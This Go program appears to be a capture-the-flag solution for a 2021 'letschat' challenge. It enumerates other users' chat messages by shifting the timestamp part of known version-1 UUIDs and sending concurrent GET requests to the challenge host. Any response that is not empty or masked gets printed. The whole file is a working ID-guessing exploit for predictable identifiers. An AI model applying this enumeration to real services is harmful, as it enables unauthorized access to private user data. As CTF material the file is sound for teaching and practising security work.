package main

import (
	"fmt"
	"strings"
	"sync"

	"io/ioutil"
	"net/http"

	"encoding/binary"
	"encoding/hex"

	"github.com/google/uuid"
)

func main() {
	ids := []string{
		"3308548f-e985-11eb-b0ba-5e91c0efb80a",
		"313e98f1-e985-11eb-b0ba-5e91c0efb80a",
		"2f74bc3f-e985-11eb-b0ba-5e91c0efb80a",
		"2daafb20-e985-11eb-b0ba-5e91c0efb80a",
		"2be13ed2-e985-11eb-b0ba-5e91c0efb80a",
	}
	for _, id := range ids {
		uid, _ := uuid.Parse(id)
		wg := &sync.WaitGroup{}
		for j := 1; j < 100; j++ {
			wg.Add(2)
			go guess(encodeHex(uid, j), wg)
			go guess(encodeHex(uid, -j), wg)
		}
		wg.Wait()
	}
}

func guess(id string, wg *sync.WaitGroup) {
	defer wg.Done()
	req, _ := http.NewRequest("GET", fmt.Sprintf("http://letschat-messages-web.2021.ctfcompetition.com/%s", id), nil)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	//fmt.Println(req)
	fmt.Println(resp)
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "No results") || strings.Contains(string(body), "Player:*******") {
		return
	}
	fmt.Printf("%s:%s\n", id, string(body))
}

func encodeHex(uid uuid.UUID, inc int) string {
	uuid, _ := uid.MarshalBinary()
	dst := [36]byte{}
	var newNanoSec uint32
	if inc < 0 {
		newNanoSec = binary.BigEndian.Uint32(uuid[0:4]) - uint32(inc*-1)
	} else {
		newNanoSec = binary.BigEndian.Uint32(uuid[0:4]) + uint32(inc)
	}
	newNanoSecSlice := [4]byte{}
	binary.BigEndian.PutUint32(newNanoSecSlice[:], newNanoSec)
	hex.Encode(dst[:], newNanoSecSlice[:])
	dst[8] = '-'
	hex.Encode(dst[9:13], uuid[4:6])
	dst[13] = '-'
	hex.Encode(dst[14:18], uuid[6:8])
	dst[18] = '-'
	hex.Encode(dst[19:23], uuid[8:10])
	dst[23] = '-'
	hex.Encode(dst[24:], uuid[10:])
	return string(dst[:])
}